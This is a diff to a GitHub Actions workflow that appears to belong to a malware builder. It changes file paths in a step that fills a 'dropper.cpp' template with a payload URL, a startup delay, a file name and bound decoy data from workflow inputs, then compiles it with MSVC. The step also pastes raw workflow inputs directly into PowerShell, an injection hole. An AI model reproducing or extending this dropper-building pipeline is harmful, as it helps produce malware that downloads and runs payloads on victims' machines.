@@ -36,7 +36,7 @@ jobs:
 
       - name: Replace placeholders
         run: |
-          $content = Get-Content -Path src\templates\remote\dropper.cpp -Raw
+          $content = Get-Content -Path dropper.cpp -Raw
           $content = $content -replace '{{FILE_NAME}}', '${{ github.event.inputs.file_name }}'
           $content = $content -replace '{{PAYLOAD_URL}}', '${{ github.event.inputs.payload_url }}'
           $content = $content -replace '{{STARTUP_DELAY_MS}}', '${{ github.event.inputs.startup_delay_ms }}'
@@ -47,7 +47,7 @@ jobs:
           if ('${{ github.event.inputs.bound_file_data }}' -ne '') {
               $content = $content -replace '{{BOUND_FILE_DATA}}', '${{ github.event.inputs.bound_file_data }}'
           }
-          Set-Content -Path src\templates\remote\dropper.cpp -Value $content
+          Set-Content -Path dropper.cpp -Value $content
 
       - name: Set up MSVC
         uses: ilammy/msvc-dev-cmd@v1
